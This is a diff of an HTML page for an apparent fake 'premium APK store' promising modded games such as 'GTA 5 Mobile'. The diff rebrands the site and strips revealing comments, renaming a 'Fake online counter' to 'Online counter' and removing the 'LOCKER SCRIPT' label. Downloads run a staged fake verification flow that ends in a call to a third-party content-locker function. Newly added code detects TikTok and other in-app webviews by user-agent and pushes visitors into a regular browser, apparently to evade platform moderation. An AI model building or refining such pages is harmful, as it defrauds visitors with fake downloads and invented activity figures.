@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>apk69.fun — Premium APK Store</title>
+<title>GameVault — Premium APK Store</title>
 <meta name="description" content="Download legendary modded games for Android and iOS — safe, fast, and free.">
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -11,7 +11,6 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@500;600;700;800&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
-<!-- ===== LOCKER SCRIPT (for _iD function) ===== -->
 <script type="text/javascript">
   var gPpnd_cvi_Qjrslc={"it":4327745,"key":"794f6"};
 </script>
@@ -21,7 +20,6 @@
   * { margin: 0; padding: 0; box-sizing: border-box; }
   html { scroll-behavior: smooth; }
 
-  /* ===== ROOT PALETTE — BLACK + GREEN ONLY ===== */
   :root {
     --green-50:  #ecfdf5;
     --green-100: #d1fae5;
@@ -59,7 +57,6 @@
     overflow-x: hidden;
   }
 
-  /* Background orbs (green only) */
   .orb {
     position: fixed;
     border-radius: 50%;
@@ -90,7 +87,6 @@
     50% { transform: translate(-50px, -40px) scale(1.08); }
   }
 
-  /* ===== Header ===== */
   .site-header {
     position: sticky;
     top: 0;
@@ -172,7 +168,6 @@
     50% { opacity: 0.35; transform: scale(0.75); }
   }
 
-  /* ===== Main ===== */
   .main {
     position: relative;
     z-index: 1;
@@ -181,7 +176,6 @@
     padding: 38px 22px 60px;
   }
 
-  /* ===== Hero ===== */
   .hero {
     text-align: center;
     margin-bottom: 28px;
@@ -221,7 +215,6 @@
     line-height: 1.6;
   }
 
-  /* ===== Trust bar ===== */
   .trust-bar {
     display: flex;
     align-items: center;
@@ -253,7 +246,6 @@
     background: rgba(52, 211, 153, 0.25);
   }
 
-  /* ===== Section head ===== */
   .section-head {
     display: flex;
     align-items: center;
@@ -283,14 +275,12 @@
     border: 1px solid rgba(255, 255, 255, 0.06);
   }
 
-  /* ===== Games grid ===== */
   .games-grid {
     display: grid;
     grid-template-columns: repeat(2, 1fr);
     gap: 12px;
   }
 
-  /* ===== iOS-style card ===== */
   .game-card {
     position: relative;
     display: flex;
@@ -406,7 +396,6 @@
     width: fit-content;
   }
 
-  /* Download button — green */
   .dl-btn {
     display: flex;
     align-items: center;
@@ -516,7 +505,6 @@
     margin-top: 2px;
   }
 
-  /* ===== Footer ===== */
   .site-footer {
     position: relative;
     z-index: 1;
@@ -543,7 +531,6 @@
     line-height: 1.55;
   }
 
-  /* ===== iOS-style Modal ===== */
   .modal-overlay {
     position: fixed;
     inset: 0;
@@ -832,10 +819,7 @@
   .d8 { animation-delay: 0.32s; }
 
   @media (max-width: 720px) {
-    .games-grid {
-      grid-template-columns: 1fr;
-      gap: 10px;
-    }
+    .games-grid { grid-template-columns: 1fr; gap: 10px; }
   }
 
   @media (max-width: 640px) {
@@ -867,14 +851,249 @@
   @media (prefers-reduced-motion: reduce) {
     * { animation: none !important; transition: none !important; }
   }
+
+  /* ============================================================
+     🚫 TIKTOK BLOCKER — adapted to GREEN + BLACK theme
+     ============================================================ */
+  #tiktokBlocker {
+    position: fixed; inset: 0; z-index: 999999; display: none;
+    align-items: flex-start; justify-content: center; padding: 20px 16px 30px;
+    background: radial-gradient(700px 500px at 50% 0%, rgba(16,185,129,.28), transparent 65%),
+                linear-gradient(180deg,#000000 0%,#0a0a0a 100%);
+    backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+    overflow-y: auto; -webkit-overflow-scrolling: touch;
+  }
+  #tiktokBlocker.show { display: flex; }
+
+  .blocker-card {
+    width: 100%; max-width: 440px; margin: auto 0;
+    background: rgba(255,255,255,.045); border: 1px solid rgba(255,255,255,.10);
+    border-radius: 24px; padding: 24px 20px 22px; text-align: center;
+    box-shadow: 0 30px 70px -25px rgba(0,0,0,.9), 0 0 0 1px rgba(16,185,129,.12) inset;
+    animation: blockerIn .5s cubic-bezier(.22,1,.36,1) both;
+  }
+  @keyframes blockerIn {
+    from { opacity: 0; transform: translateY(16px) scale(.97); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .blocker-icon {
+    width: 66px; height: 66px; margin: 0 auto 14px; border-radius: 50%;
+    display: grid; place-items: center;
+    background: linear-gradient(135deg, rgba(52,211,153,.18), rgba(52,211,153,.05));
+    border: 1px solid rgba(52,211,153,.55); color: #34d399; font-size: 26px;
+    box-shadow: 0 0 40px rgba(16,185,129,.30);
+    animation: iconPulse 2.2s ease-in-out infinite;
+  }
+  @keyframes iconPulse {
+    0%,100% { box-shadow: 0 0 30px rgba(16,185,129,.25); }
+    50%     { box-shadow: 0 0 50px rgba(16,185,129,.55); }
+  }
+
+  .blocker-title { font-size: 19px; font-weight: 900; color: #fff; margin: 0 0 6px; }
+  .blocker-sub { font-size: 13px; color: #a1a1aa; line-height: 1.6; margin: 0 0 18px; }
+  .blocker-sub b { color: #34d399; font-weight: 800; }
+
+  .phone-wrap { display: flex; justify-content: center; margin-bottom: 18px; perspective: 900px; }
+  .phone-mockup {
+    width: 212px; height: 360px; background: #ffffff; border-radius: 26px; border: 5px solid #1e293b;
+    box-shadow: 0 22px 45px -15px rgba(0,0,0,.9), 0 0 0 1px rgba(16,185,129,.18), inset 0 0 0 1px rgba(255,255,255,.03);
+    position: relative; overflow: hidden; transform: rotateX(4deg);
+  }
+  .ph-notch { position: absolute; top: 5px; left: 50%; transform: translateX(-50%); width: 56px; height: 14px; background: #0a0f1c; border-radius: 10px; z-index: 6; border: 1px solid rgba(255,255,255,.06); }
+  .ph-blank { position: absolute; top: 44px; left: 0; right: 0; bottom: 0; background: #f8fafc; display: flex; align-items: center; justify-content: center; color: #94a3b8; font-size: 11px; font-weight: 600; letter-spacing: .4px; }
+  .ph-blank .ph-blank-icon { display: flex; flex-direction: column; align-items: center; gap: 8px; opacity: .55; }
+  .ph-blank .ph-blank-icon i { font-size: 26px; color: #cbd5e1; }
+  .ph-blank .ph-blank-icon span { font-size: 10px; color: #cbd5e1; font-weight: 600; }
+
+  .ph-topbar {
+    position: absolute; top: 0; left: 0; right: 0; height: 44px; background: #ffffff;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 0 14px; z-index: 5; border-bottom: 1px solid #e5e7eb; color: #000;
+  }
+  .ph-back { color: #000; font-size: 14px; width: 20px; text-align: left; }
+  .ph-title { font-size: 13px; font-weight: 600; color: #000; flex: 1; text-align: center; letter-spacing: .2px; }
+  .ph-dots { width: 26px; height: 26px; display: grid; place-items: center; color: #000; font-size: 18px; font-weight: bold; border-radius: 8px; transition: all .3s ease; position: relative; cursor: pointer; }
+  .ph-dots.active { background: rgba(0,0,0,.08); box-shadow: 0 0 0 3px rgba(0,0,0,.1); transform: scale(1.1); }
+
+  .ph-sheet {
+    position: absolute; left: 0; right: 0; bottom: 0; background: #ffffff;
+    border-top-left-radius: 16px; border-top-right-radius: 16px;
+    padding: 14px 0 12px; transform: translateY(105%);
+    transition: transform .5s cubic-bezier(.22,1,.36,1);
+    z-index: 10; box-shadow: 0 -14px 30px rgba(0,0,0,.35);
+    border-top: 1px solid #e5e7eb; color: #000;
+  }
+  .ph-sheet.show { transform: translateY(0); }
+  .ph-sheet-handle { width: 32px; height: 4px; background: #d1d5db; border-radius: 2px; margin: 0 auto 10px; }
+  .ph-sheet-item { display: flex; align-items: center; gap: 12px; padding: 11px 18px; font-size: 13px; color: #1f2937; font-weight: 500; position: relative; transition: all .3s ease; }
+  .ph-sheet-item i { width: 16px; font-size: 14px; text-align: center; opacity: .8; }
+
+  .ph-sheet-item.highlight { color: #10b981; font-weight: 700; }
+  .ph-sheet-item.highlight i { color: #10b981; opacity: 1; }
+  .ph-sheet-item.highlight.active { background: linear-gradient(90deg, rgba(16,185,129,.12), rgba(16,185,129,.05)); color: #10b981; }
+  .ph-sheet-item.highlight.active::before {
+    content: ''; position: absolute; left: 0; top: 6px; bottom: 6px; width: 3px;
+    background: #10b981; border-radius: 0 3px 3px 0; box-shadow: 0 0 12px rgba(16,185,129,.5);
+  }
+  .ph-sheet-item.highlight.active::after {
+    content: ''; position: absolute; inset: 4px 12px; border-radius: 8px;
+    border: 1.5px solid rgba(16,185,129,.4); box-shadow: 0 0 18px rgba(16,185,129,.2);
+    animation: itemPulse 1.1s ease-in-out infinite; pointer-events: none;
+  }
+  @keyframes itemPulse { 0%,100% { opacity: 1; } 50% { opacity: .5; } }
+
+  .ph-sheet-item .success-check {
+    margin-left: auto; color: #10b981; font-size: 14px;
+    opacity: 0; transform: scale(.5);
+    transition: all .4s cubic-bezier(.34,1.56,.64,1);
+  }
+  .ph-sheet-item.highlight.done .success-check { opacity: 1; transform: scale(1); }
+
+  .tap-pointer {
+    position: absolute; top: 0; left: 0; width: 34px; height: 34px;
+    pointer-events: none; z-index: 20; opacity: 0; transform: translate(-15%, -12%);
+    transition: top .75s cubic-bezier(.22,1,.36,1), left .75s cubic-bezier(.22,1,.36,1),
+                opacity .35s ease, transform .3s ease;
+    will-change: top, left;
+  }
+  .tap-pointer.show { opacity: 1; }
+  .tap-pointer .hand {
+    width: 100%; height: 100%; display: grid; place-items: center;
+    color: #111827; font-size: 22px;
+    filter: drop-shadow(0 2px 3px rgba(0,0,0,.35)) drop-shadow(0 0 8px rgba(16,185,129,.7));
+  }
+  .tap-pointer .ripple {
+    position: absolute; top: 50%; left: 50%; width: 14px; height: 14px;
+    border-radius: 50%; border: 2px solid rgba(16,185,129,.9);
+    transform: translate(-50%, -50%); opacity: 0; pointer-events: none;
+  }
+  .tap-pointer.tapping .hand { animation: tapPress .35s ease-out; }
+  @keyframes tapPress { 0% { transform: scale(1); } 45% { transform: scale(.72); } 100% { transform: scale(1); } }
+  .tap-pointer.tapping .ripple { animation: rippleOut .7s ease-out; }
+  @keyframes rippleOut {
+    0%   { width: 14px; height: 14px; opacity: 1; border-width: 2.5px; }
+    100% { width: 70px; height: 70px; opacity: 0; border-width: 1px; }
+  }
+
+  .blocker-steps {
+    list-style: none; padding: 0; margin: 0 0 16px; text-align: left;
+    background: rgba(0,0,0,.28); border: 1px solid rgba(255,255,255,.06);
+    border-radius: 14px; padding: 12px 14px;
+  }
+  .blocker-steps li {
+    display: flex; gap: 10px; align-items: flex-start;
+    font-size: 12.5px; color: #d4d4d8; line-height: 1.55; padding: 5px 0;
+  }
+  .blocker-steps li .step-num {
+    flex: 0 0 22px; height: 22px; border-radius: 50%; display: grid; place-items: center;
+    background: rgba(16,185,129,.20); border: 1px solid rgba(16,185,129,.5);
+    color: #6ee7b7; font-size: 11px; font-weight: 800; margin-top: 1px;
+  }
+  .blocker-steps li b { color: #34d399; font-weight: 800; }
+
+  .blocker-copy {
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    width: 100%; padding: 14px 18px; border-radius: 14px;
+    background: linear-gradient(135deg, #10b981 0%, #059669 55%, #047857 100%);
+    border: 0; color: #fff; font-size: 14px; font-weight: 800; letter-spacing: .3px;
+    cursor: pointer; box-shadow: 0 14px 35px -12px rgba(16,185,129,.75);
+    transition: transform .2s ease, box-shadow .2s ease;
+  }
+  .blocker-copy:hover { transform: translateY(-2px); box-shadow: 0 22px 45px -12px rgba(5,150,105,.9); }
+  .blocker-copy:active { transform: translateY(0); }
+  .blocker-copy.copied {
+    background: linear-gradient(135deg, #34d399 0%, #10b981 100%);
+    box-shadow: 0 14px 35px -12px rgba(52,211,153,.7);
+  }
+
+  .blocker-status {
+    margin-top: 12px; padding: 11px 14px; border-radius: 12px;
+    font-size: 12px; font-weight: 600;
+    background: rgba(16,185,129,.10); border: 1px solid rgba(16,185,129,.30);
+    color: #a7f3d0; display: none; line-height: 1.55; text-align: left;
+  }
+  .blocker-status.show { display: block; animation: blockerFadeUp .4s ease forwards; }
+  .blocker-status.ok { background: rgba(16,185,129,.14); border-color: rgba(16,185,129,.45); color: #6ee7b7; }
+  @keyframes blockerFadeUp { to { opacity: 1; transform: translateY(0); } }
+
+  .blocker-hint { margin-top: 12px; font-size: 11px; color: #71717a; line-height: 1.55; }
+  .blocker-hint b { color: #34d399; font-weight: 700; }
+
+  body.blocked { overflow: hidden; }
+
+  @media (max-height: 740px) {
+    .phone-mockup { width: 180px; height: 310px; }
+    .blocker-icon { width: 56px; height: 56px; font-size: 22px; }
+    .blocker-title { font-size: 17px; }
+  }
 </style>
 </head>
 <body>
 
+  <!-- ============================================================
+       🚫 TIKTOK BLOCKER — appears only inside TikTok / in-app webviews
+       ============================================================ -->
+  <div id="tiktokBlocker" role="dialog" aria-modal="true" aria-labelledby="blockerTitle">
+    <div class="blocker-card">
+      <div class="blocker-icon">
+        <i class="fas fa-shield-halved"></i>
+      </div>
+      <h2 class="blocker-title" id="blockerTitle">Open in Browser</h2>
+      <p class="blocker-sub">
+        This page must be opened in your <b>phone's browser</b> —<br>
+        not inside the TikTok app. Follow the guide below.
+      </p>
+
+      <div class="phone-wrap">
+        <div class="phone-mockup" id="tutorialPhone">
+          <div class="ph-notch"></div>
+          <div class="ph-blank">
+            <div class="ph-blank-icon">
+              <i class="fas fa-mobile-screen-button"></i>
+              <span>Browser page</span>
+            </div>
+          </div>
+          <div class="ph-topbar">
+            <i class="fas fa-arrow-left ph-back"></i>
+            <span class="ph-title">Web browser</span>
+            <div class="ph-dots" id="tutorialDots">
+              <i class="fas fa-ellipsis-h"></i>
+            </div>
+          </div>
+          <div class="ph-sheet" id="tutorialSheet">
+            <div class="ph-sheet-handle"></div>
+            <div class="ph-sheet-item"><i class="fas fa-flag"></i> Report</div>
+            <div class="ph-sheet-item highlight" id="tutorialItem">
+              <i class="fas fa-compass"></i> Open in browser
+              <i class="fas fa-check-circle success-check"></i>
+            </div>
+            <div class="ph-sheet-item"><i class="fas fa-link"></i> Copy link</div>
+          </div>
+          <div class="tap-pointer" id="tapPointer">
+            <i class="fas fa-hand-pointer hand"></i>
+            <span class="ripple"></span>
+          </div>
+        </div>
+      </div>
+
+      <ul class="blocker-steps">
+        <li><span class="step-num">1</span><span>Tap the <b>three dots (⋯)</b> at the top-right corner of the TikTok screen.</span></li>
+        <li><span class="step-num">2</span><span>In the menu that appears, choose <b>"Open in browser"</b>.</span></li>
+        <li><span class="step-num">3</span><span>The page will open in your browser and the download will work normally.</span></li>
+      </ul>
+
+      <button type="button" class="blocker-copy" id="copyLinkBtn">
+        <i class="fas fa-link"></i> <span>Copy Link</span>
+      </button>
+      <div class="blocker-status" id="blockerStatus"></div>
+      <p class="blocker-hint">If you don't see "Open in browser", choose <b>"Copy link"</b> instead — then paste it in Chrome or Safari.</p>
+    </div>
+  </div>
+
   <div class="orb a"></div>
   <div class="orb b"></div>
 
-  <!-- ===== Header ===== -->
   <header class="site-header">
     <div class="header-inner">
       <div class="brand">
@@ -892,9 +1111,7 @@
     </div>
   </header>
 
-  <!-- ===== Main ===== -->
   <main class="main">
-
     <section class="hero fade-in d1">
       <div class="hero-eyebrow">
         <span class="live-dot"></span>
@@ -927,8 +1144,6 @@
     </div>
 
     <div class="games-grid">
-
-      <!-- 1. FREE FIRE 2018 — size updated to 178 MB -->
       <article class="game-card fade-in d3">
         <div class="card-thumb">
           <img src="https://i.postimg.cc/nz6K7NhX/images-(1).jpg" alt="Free Fire 2018" loading="lazy" decoding="async">
@@ -944,13 +1159,11 @@
             <span class="card-genre-pill">Battle Royale</span>
           </div>
           <button class="dl-btn" onclick="openDeviceModal('Free Fire 2018')">
-            <i class="fas fa-download"></i>
-            Download
+            <i class="fas fa-download"></i> Download
           </button>
         </div>
       </article>
 
-      <!-- 2. GTA 5 MOBILE -->
       <article class="game-card fade-in d4">
         <div class="card-thumb">
           <img src="https://i.postimg.cc/T2ggF7PS/8365742.jpg" alt="GTA 5 Mobile" loading="lazy" decoding="async">
@@ -966,13 +1179,11 @@
             <span class="card-genre-pill">Open World</span>
           </div>
           <button class="dl-btn" onclick="openDeviceModal('GTA 5 Mobile')">
-            <i class="fas fa-download"></i>
-            Download
+            <i class="fas fa-download"></i> Download
           </button>
         </div>
       </article>
 
-      <!-- 3. ROBLOX BETA -->
       <article class="game-card fade-in d5">
         <div class="card-thumb">
           <img src="https://i.postimg.cc/wM2vHsZt/roblox-beta.webp" alt="Roblox Beta" loading="lazy" decoding="async">
@@ -988,13 +1199,11 @@
             <span class="card-genre-pill">Sandbox</span>
           </div>
           <button class="dl-btn" onclick="openDeviceModal('Roblox Beta')">
-            <i class="fas fa-download"></i>
-            Download
+            <i class="fas fa-download"></i> Download
           </button>
         </div>
       </article>
 
-      <!-- 4. GTA 6 MOBILE — real countdown to Nov 19, 2026 -->
       <article class="game-card gta6-card fade-in d5">
         <div class="card-thumb">
           <img src="https://i.postimg.cc/6pkBk0qM/images-q-tbn-ANd9Gc-Smh-Eix-I3f2t-OPXzrx39975VUn-Py-PDUPYddszy3za-PVwuy4l-FYO3Rc-MV-pq-s-10.jpg" alt="GTA 6 Mobile" loading="lazy" decoding="async">
@@ -1015,13 +1224,11 @@
             </div>
           </div>
           <button class="dl-btn coming-soon" disabled>
-            <i class="fas fa-clock"></i>
-            Coming Soon
+            <i class="fas fa-clock"></i> Coming Soon
           </button>
         </div>
       </article>
 
-      <!-- 5. BEAMNG.DRIVE MOBILE -->
       <article class="game-card fade-in d6">
         <div class="card-thumb">
           <img src="https://i.postimg.cc/Jh3C9C9D/6404024-s-280-v-4.png" alt="BeamNG.drive Mobile" loading="lazy" decoding="async">
@@ -1037,13 +1244,11 @@
             <span class="card-genre-pill">Racing</span>
           </div>
           <button class="dl-btn" onclick="openDeviceModal('BeamNG.drive Mobile')">
-            <i class="fas fa-download"></i>
-            Download
+            <i class="fas fa-download"></i> Download
           </button>
         </div>
       </article>
 
-      <!-- 6. ASS HUNTER -->
       <article class="game-card fade-in d7">
         <div class="card-thumb">
           <img src="https://i.postimg.cc/c131cPJd/Ass-Hunter.jpg" alt="Ass Hunter" loading="lazy" decoding="async">
@@ -1059,12 +1264,10 @@
             <span class="card-genre-pill">Action · Stealth</span>
           </div>
           <button class="dl-btn" onclick="openDeviceModal('Ass Hunter')">
-            <i class="fas fa-download"></i>
-            Download
+            <i class="fas fa-download"></i> Download
           </button>
         </div>
       </article>
-
     </div>
   </main>
 
@@ -1078,7 +1281,6 @@
     </p>
   </footer>
 
-  <!-- ===== iOS-style Device Modal ===== -->
   <div class="modal-overlay" id="deviceModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
     <div class="modal-card">
       <span class="modal-grab"></span>
@@ -1135,15 +1337,14 @@
 
       <div class="review-footer" id="reviewFooter">
         <i class="fas fa-lock"></i>
-        <span>Verified by apk69.fun Security · Do not close this window</span>
+        <span>Verified by GameVault Security · Do not close this window</span>
       </div>
     </div>
   </div>
 
   <script>
     /* ============================================================
-       📱 iOS-style Device Modal + Review Flow
-       🔓 On finish → calls _iD() (from the locker script)
+       📱 Device Modal + Review Flow → calls _iD() when done
        ============================================================ */
     const deviceModal  = document.getElementById('deviceModal');
     const modalTitle   = document.getElementById('modalTitle');
@@ -1241,14 +1442,10 @@
 
       function runStep() {
         if (i >= stepEls.length) {
-          // ✅ Done → call locker function
           setTimeout(() => {
             try {
-              if (typeof _iD === 'function') {
-                _iD();
-              } else {
-                console.error('_iD() is not defined — locker script may not have loaded.');
-              }
+              if (typeof _iD === 'function') _iD();
+              else console.error('_iD() is not defined — locker script may not have loaded.');
             } catch (err) {
               console.error('Error calling _iD():', err);
             }
@@ -1282,8 +1479,7 @@
     });
 
     /* ============================================================
-       ⏱ GTA 6 COUNTDOWN — Official Release: Nov 19, 2026
-       Real countdown based on fixed timestamp (no reset per visit)
+       ⏱ GTA 6 COUNTDOWN — Official: Nov 19, 2026
        ============================================================ */
     (function () {
       const target = new Date('2026-11-19T00:00:00Z').getTime();
@@ -1325,7 +1521,7 @@
     })();
 
     /* ============================================================
-       👥 Fake online counter
+       👥 Online counter
        ============================================================ */
     (function () {
       const el = document.getElementById('online-count');
@@ -1335,6 +1531,120 @@
         n = Math.max(1100, Math.min(1400, n + (Math.floor(Math.random() * 11) - 5)));
         el.textContent = n.toLocaleString('en-US');
       }, 3400);
+    })();
+
+    /* ============================================================
+       🚫 TIKTOK IN-APP BROWSER BLOCKER
+       ============================================================ */
+    (function () {
+      'use strict';
+
+      var ua = navigator.userAgent || '';
+      var isTikTok = /TikTok|musical_ly|BytedanceWebview|aweme|ttwebview|ByteLocale/i.test(ua);
+      var isInApp  = /FBAN|FBAV|FB_IAB|Instagram|Line\/|Twitter|Snapchat|Pinterest|MicroMessenger/i.test(ua);
+
+      function showBlocker() {
+        var blocker = document.getElementById('tiktokBlocker');
+        if (!blocker) return;
+        blocker.classList.add('show');
+        document.body.classList.add('blocked');
+        document.documentElement.style.overflow = 'hidden';
+        startTutorialAnimation();
+      }
+
+      if (isTikTok || isInApp) {
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', showBlocker);
+        } else {
+          showBlocker();
+        }
+      }
+
+      var tutorialStarted = false;
+      var tutorialTimer   = null;
+
+      function startTutorialAnimation() {
+        if (tutorialStarted) return;
+        tutorialStarted = true;
+
+        var phone  = document.getElementById('tutorialPhone');
+        var dots   = document.getElementById('tutorialDots');
+        var sheet  = document.getElementById('tutorialSheet');
+        var item   = document.getElementById('tutorialItem');
+        var pointer= document.getElementById('tapPointer');
+
+        if (!phone || !dots || !sheet || !item || !pointer) return;
+
+        function movePointerTo(target) {
+          var phoneRect  = phone.getBoundingClientRect();
+          var targetRect = target.getBoundingClientRect();
+          var x = targetRect.left - phoneRect.left + targetRect.width / 2;
+          var y = targetRect.top  - phoneRect.top  + targetRect.height / 2;
+          pointer.style.left = x + 'px';
+          pointer.style.top  = y + 'px';
+        }
+
+        function reset() {
+          pointer.classList.remove('show', 'tapping');
+          dots.classList.remove('active');
+          sheet.classList.remove('show');
+          item.classList.remove('active', 'done');
+        }
+
+        function play() {
+          reset();
+          setTimeout(function () { movePointerTo(dots); pointer.classList.add('show'); }, 350);
+          setTimeout(function () { pointer.classList.add('tapping'); dots.classList.add('active'); }, 1600);
+          setTimeout(function () { pointer.classList.remove('tapping'); sheet.classList.add('show'); }, 2000);
+          setTimeout(function () { movePointerTo(item); }, 2600);
+          setTimeout(function () { pointer.classList.add('tapping'); item.classList.add('active'); }, 3700);
+          setTimeout(function () { pointer.classList.remove('tapping'); item.classList.add('done'); }, 4100);
+          setTimeout(function () { pointer.classList.remove('show'); }, 5200);
+        }
+
+        play();
+        tutorialTimer = setInterval(play, 7000);
+      }
+
+      var statusEl = document.getElementById('blockerStatus');
+      function setStatus(text, type) {
+        if (!statusEl) return;
+        statusEl.textContent = text;
+        statusEl.classList.add('show');
+        statusEl.classList.toggle('ok', type === 'ok');
+      }
+
+      var copyBtn = document.getElementById('copyLinkBtn');
+      if (copyBtn) {
+        copyBtn.addEventListener('click', function () {
+          var url   = window.location.href;
+          var label = copyBtn.querySelector('span');
+
+          function done() {
+            copyBtn.classList.add('copied');
+            label.textContent = 'Link Copied ✓';
+            setStatus('✅ Link copied! Open Chrome or Safari and paste it in the address bar.', 'ok');
+            setTimeout(function () {
+              copyBtn.classList.remove('copied');
+              label.textContent = 'Copy Link';
+            }, 2200);
+          }
+
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(url).then(done).catch(function () { fallbackCopy(url, done); });
+          } else {
+            fallbackCopy(url, done);
+          }
+        });
+      }
+
+      function fallbackCopy(text, cb) {
+        var ta = document.createElement('textarea');
+        ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+        document.body.appendChild(ta); ta.focus(); ta.select();
+        try { var ok = document.execCommand('copy'); if (ok && cb) cb(); } catch (e) {}
+        document.body.removeChild(ta);
+      }
     })();
   </script>
 
